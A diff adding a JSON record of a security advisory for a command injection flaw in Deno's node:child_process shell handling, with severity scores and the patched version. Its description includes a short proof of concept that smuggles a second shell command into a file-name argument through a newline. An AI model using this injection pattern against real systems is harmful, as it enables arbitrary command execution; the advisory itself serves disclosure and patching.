@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-hmh4-3xvx-q5hr",
+  "repo": {
+    "cve_id": "CVE-2026-27190",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\nA command injection vulnerability exists in Deno's `node:child_process` implementation. \r\n\r\n## Reproduction\r\n```javascript\r\nimport { spawnSync } from \"node:child_process\";\r\nimport * as fs from \"node:fs\";\r\n\r\n// Cleanup\r\ntry { fs.unlinkSync('/tmp/rce_proof'); } catch {}\r\n\r\n// Create legitimate script\r\nfs.writeFileSync('/tmp/legitimate.ts', 'console.log(\"normal\");');\r\n\r\n// Malicious input with newline injection\r\nconst maliciousInput = `/tmp/legitimate.ts\\ntouch /tmp/rce_proof`;\r\n\r\n// Vulnerable pattern\r\nspawnSync(Deno.execPath(), ['run', '--allow-all', maliciousInput], {\r\n  shell: true,\r\n  encoding: 'utf-8'\r\n});\r\n\r\n// Verify\r\nconsole.log('Exploit worked:', fs.existsSync('/tmp/rce_proof'));\r\n```\r\n\r\nRun: `deno run --allow-all poc.mjs`\r\n\r\nThe file `/tmp/rce_proof` is created, confirming arbitrary command execution.\r\n\r\n## Mitigation\r\n\r\nAll users need to update to the patched version (Deno v2.6.8).",
+    "ghsa_id": "GHSA-hmh4-3xvx-q5hr",
+    "html_url": "https://github.com/denoland/deno/security/advisories/GHSA-hmh4-3xvx-q5hr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-hmh4-3xvx-q5hr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-27190"
+      }
+    ],
+    "published_at": "2026-02-19T08:16:18Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via Incomplete shell metacharacter blocklist in `node:child_process`",
+    "updated_at": "2026-02-19T08:16:18Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "deno"
+        },
+        "patched_versions": "2.6.8",
+        "vulnerable_version_range": "2.6.7"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "denoland/deno"
+}
